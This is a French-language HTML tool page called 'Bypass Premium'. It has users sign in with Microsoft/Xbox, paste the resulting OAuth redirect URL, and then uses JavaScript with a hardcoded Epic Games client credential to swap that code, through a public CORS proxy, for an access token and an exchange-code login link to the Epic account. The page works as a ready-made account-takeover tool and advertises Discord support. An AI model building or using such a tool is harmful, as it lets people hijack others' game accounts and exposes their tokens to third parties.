<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypass Premium | Interface</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        body { background-color: #050505; font-family: 'Inter', sans-serif; }
        .bg-animate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 50% 50%, #1a1a2e 0%, #050505 100%); z-index: -1; }
        .glass-card { background: rgba(15, 15, 20, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(0, 255, 157, 0.1); box-shadow: 0 0 40px rgba(0, 0, 0, 0.8); }
        .neon-text { color: #00ff9d; text-shadow: 0 0 10px rgba(0, 255, 157, 0.5); font-family: 'Orbitron', sans-serif; }
        .neon-border { border: 1px solid rgba(0, 255, 157, 0.2); transition: all 0.3s ease; }
        .neon-border:focus { border-color: #00ff9d; box-shadow: 0 0 15px rgba(0, 255, 157, 0.3); outline: none; }
        .btn-premium { background: linear-gradient(135deg, #00ff9d 0%, #0078d4 100%); transition: all 0.3s ease; font-weight: 900; color: black; }
        .btn-premium:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0, 255, 157, 0.3); }
        .btn-xbox { background: #107c10; transition: all 0.3s ease; }
        .btn-xbox:hover { background: #1a941a; transform: translateY(-1px); box-shadow: 0 5px 15px rgba(16, 124, 16, 0.4); }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-6">

    <div class="bg-animate"></div>

    <div class="glass-card w-full max-w-md rounded-[30px] p-8 relative overflow-hidden">
        
        <div class="text-center mb-8">
            <h1 class="neon-text text-3xl font-black mb-1 text-center uppercase tracking-tighter">Bypass Premium</h1>
            <p class="text-gray-500 text-[10px] tracking-widest uppercase">System Security Override</p>
        </div>

        <div class="space-y-5">
            <div class="p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-2xl text-center">
                <p class="text-yellow-500 text-[11px] font-bold mb-2 uppercase">⚠️ Activation Requise</p>
                <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank" 
                   class="inline-block w-full py-2 bg-yellow-500/20 hover:bg-yellow-500/40 text-yellow-500 text-xs rounded-lg border border-yellow-500/50 transition-all">
                   ACTIVER L'ACCÈS SERVEUR
                </a>
            </div>

            <div>
                <label class="text-gray-400 text-[10px] uppercase font-bold ml-1">01. Authentification</label>
                <a href="https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code" 
                   target="_blank" 
                   class="btn-xbox flex items-center justify-center w-full py-3 rounded-xl text-white text-sm font-bold mt-1 transition-all">
                   <img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Xbox_one_logo.svg" alt="Xbox Logo" class="w-5 h-5 mr-3 brightness-0 invert">
                   Se connecter à Microsoft
                </a>
            </div>

            <div>
                <label class="text-gray-400 text-[10px] uppercase font-bold ml-1">02. Injection URL</label>
                <input type="text" id="oauthUrl" 
                       placeholder="Collez le lien de redirection ici..." 
                       class="w-full bg-black/50 neon-border p-3 rounded-xl text-sm text-white mt-1">
            </div>

            <button id="startBypass" class="btn-premium w-full py-4 rounded-xl uppercase tracking-widest text-sm mt-2">
                Démarrer le Bypass
            </button>

            <div id="status" class="text-center text-[11px] text-gray-500 h-4"></div>

            <div id="resultBox" class="hidden animate-pulse p-4 bg-green-500/10 border border-green-500/30 rounded-xl text-center">
                <p class="text-green-400 text-[11px] font-bold">INJECTION RÉUSSIE !</p>
                <a href="#" id="finalUrl" target="_blank" class="text-white text-sm underline font-bold mt-1 inline-block">
                    ACCÉDER AU COMPTE
                </a>
            </div>
        </div>

        <div class="mt-8 pt-4 border-t border-white/5 text-center">
            <p class="text-[9px] text-gray-600 tracking-widest uppercase">
                Support: <a href="https://discord.gg/zx4byHnNyF" target="_blank" class="text-green-500 hover:text-green-400 transition-colors">@1772db</a>
            </p>
        </div>
    </div>

    <script>
        const PROXY = "https://cors-anywhere.herokuapp.com/";
        const EPIC_AUTH = "Basic OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3";

        document.getElementById('startBypass').onclick = async function() {
            const urlInput = document.getElementById('oauthUrl').value;
            const status = document.getElementById('status');
            const resultBox = document.getElementById('resultBox');

            if (!urlInput.includes('code=')) {
                status.innerHTML = "❌ Lien de redirection invalide.";
                return;
            }

            const codeValue = new URLSearchParams(new URL(urlInput).search).get('code');
            status.innerHTML = "⚡ Connexion aux serveurs Epic...";

            try {
                const r1 = await fetch(PROXY + 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': EPIC_AUTH, 'X-Requested-With': 'XMLHttpRequest' },
                    body: new URLSearchParams({ 'grant_type': 'external_auth', 'external_auth_type': 'xbl', 'external_auth_token': codeValue })
                });
                const d1 = await r1.json();
                if(!d1.access_token) throw new Error();

                status.innerHTML = "⚡ Génération de l'accès...";
                const r2 = await fetch(PROXY + 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange', {
                    method: 'GET',
                    headers: { 'Authorization': `Bearer ${d1.access_token}`, 'X-Requested-With': 'XMLHttpRequest' }
                });
                const d2 = await r2.json();

                if (d2.code) {
                    status.innerHTML = "";
                    resultBox.style.display = 'block';
                    document.getElementById('finalUrl').href = `https://www.epicgames.com/id/exchange?exchangeCode={real_code}&redirect_uri=https%3A%2F%2Fwww.epicgames.com%2Faccount%2Fpersonal%3Fmode%3Dgame&prompt=none`.replace('{real_code}', d2.code);
                }
            } catch (e) {
                status.innerHTML = "<span class='text-red-500 font-bold'>❌ Erreur. Activez d'abord l'accès serveur.</span>";
            }
        };
    </script>
</body>
</html>
